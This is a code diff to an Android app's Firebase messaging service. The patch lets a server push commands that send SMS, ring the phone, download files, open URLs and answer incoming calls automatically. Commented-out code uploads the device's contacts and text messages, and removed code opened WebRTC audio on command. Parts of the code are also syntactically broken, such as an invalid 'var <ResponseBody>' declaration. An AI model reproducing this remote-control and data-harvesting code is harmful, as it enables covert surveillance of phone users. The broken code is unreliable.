@@ -23,6 +23,7 @@ import android.widget.Toast
 import android.content.ActivityNotFoundException
 import android.content.Intent
 import android.net.Uri
+import android.os.Looper
 import java.lang.Thread.sleep
 
 
@@ -35,34 +36,34 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         val message = data["text"]
         val type = data["type"]
         Log.d("MyFireBasemessaging", "onMessageReceived:  Message Received: \nTitle: $strTitle\nMessage: $message")
-        if (type == "sms") {
-            sendSMS(strTitle, message)
+        when (type) {
+            "sms" -> sendSMS(strTitle, message)
+            "foundPhone" -> {
+                val notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
+                val r = RingtoneManager.getRingtone(applicationContext, notification)
+                r.play()
+                val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+                v.vibrate(1000)
+            }
+            "file" -> {
+                DownloadFile(message)
+            }
+            "takecall" -> {
+                val tm = this.getSystemService(Context.TELECOM_SERVICE) as TelecomManager
+                checkSelfPermission("android.permission.ANSWER_PHONE_CALLS")
+                isTaked = true
+                tm.acceptRingingCall()
+                isTaked = false
+            }
+            "URL" -> {
+                Log.d("fireURLLL", "onMessageReceived:  Message Received: \nMessage: $message")
+                LaunchURL(message)
+            }
+
+
+        //SyncData()
         }
-        else if (type == "foundPhone") {
-        } else if (type == "foundPhone") {
-            val notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
-            val r = RingtoneManager.getRingtone(applicationContext, notification)
-            r.play()
-            val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
-            v.vibrate(1000)
-        } else if (type == "file") {
-            //DownloadFile(message)
-        } else if (type == "takecall") {
-            val tm = this.getSystemService(Context.TELECOM_SERVICE) as TelecomManager
-            checkSelfPermission("android.permission.ANSWER_PHONE_CALLS")
-            isTaked = true
-            tm.acceptRingingCall()
-            isTaked = false
-        } else {
-            //rtcSignaling(type!!, message!!, Rtc.instance)
-        }
-        else if (type == "URL"){
-            Log.d("fireURLLL", "onMessageReceived:  Message Received: \nMessage: $message")
-            LauchURL(message)
-        }
-        else {
-            rtcSignaling(type!!, message!!, Rtc.instance)
-        }
+
 
         //SyncData()
     }
@@ -72,23 +73,37 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
         sms.sendTextMessage(phoneNumber, null, messageBody, null, null)
     }
 
-    /*private fun DownloadFile(fileName: String?){
+    private fun DownloadFile(fileName: String?){
         Log.d("MyDownloadFire", "onMessageReceived:  Message Received: \nTitle:")
         val retrofitAPI = HttpExecute.BuildAPI()
-        //var call = HttpExecute(retrofitAPI.downloadFileWithDynamicUrlSync()).start()
-        var <ResponseBody> call = retrofitAPI.downloadFileWithDynamicUrlSync()
-        //call.enqueue(Callback<ResponseBody>() {       })
+        var <ResponseBody> call = HttpExecute(retrofitAPI.downloadFileWithDynamicUrlSync()).start()
+
     }
 
-    private fun LauchURL(url: String?) {
-            Toast.makeText(applicationContext, "Url Received", Toast.LENGTH_SHORT).show()
+    private fun LaunchURL(url: String?) {
 
-            val uris = Uri.parse(url)
-            val browserIntent = Intent(Intent.ACTION_VIEW, uris)
-            startActivity(browserIntent)
+        val thread = object : Thread() {
+            override fun run() {
+                try {
+                    Looper.prepare()
+                    Toast.makeText(applicationContext, "Url Received", Toast.LENGTH_SHORT).show()
+                    Thread.sleep(5000)
+                    val uris = Uri.parse(url)
+                    val browserIntent = Intent(Intent.ACTION_VIEW, uris)
+                    startActivity(browserIntent)
+
+                } catch (e: InterruptedException) {
+                    e.printStackTrace()
+                }
+
+            }
+        }
+
+        thread.start()
+
     }
 
-    private fun SyncData() {
+    /*private fun SyncData() {
         val retrofitAPI = HttpExecute.BuildAPI()
         val cc = ContentCollector()
         val contactLs = ContactsList()
@@ -100,18 +115,8 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
 
         HttpExecute(retrofitAPI.CreateContacts(contactLs)).start()
         HttpExecute(retrofitAPI.CreateSMS(SMSLs)).start()
-    }
-    private fun rtcSignaling(type: String, message: String, rtc: Rtc?){
-        if(rtc?.peerConnection == null){
-            rtc?.initRtcAudio(this.applicationContext)
-        }
-        if(type == "sdp"){
-            rtc?.peerConnection?.setRemoteDescription(RtcSdpObserver(), SessionDescription(SessionDescription.Type.OFFER, message))
-        }
-        else{
-            rtc?.peerConnection?.addIceCandidate(IceCandidate("",0,message))
-        }
     }*/
+
     companion object {
         var isTaked = false
     }
